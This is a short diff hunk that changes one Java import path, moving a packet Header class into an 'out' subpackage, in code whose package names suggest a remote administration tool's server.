@@ -38,7 +38,7 @@ import com.redpois0n.Script;
 import com.redpois0n.Slave;
 import com.redpois0n.exceptions.CloseException;
 import com.redpois0n.listeners.Performable;
-import com.redpois0n.packets.Header;
+import com.redpois0n.packets.out.Header;
 import com.redpois0n.plugins.Plugin;
 import com.redpois0n.plugins.PluginLoader;
 import com.redpois0n.plugins.RATServerFormat;
